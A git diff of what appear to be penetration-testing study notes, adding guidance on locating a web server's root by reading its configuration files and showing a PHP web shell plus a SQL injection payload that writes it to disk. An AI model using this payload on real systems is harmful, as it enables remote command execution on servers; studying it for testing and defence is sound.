@@ -462,8 +462,9 @@ ExampLe Shell:
 ```php
 <?php system($_REQUEST[0]); ?>
 ```
+> Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
 
-Example injection to write our chell
+Example injection to write our shell
 ```sql
 cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 
 ```
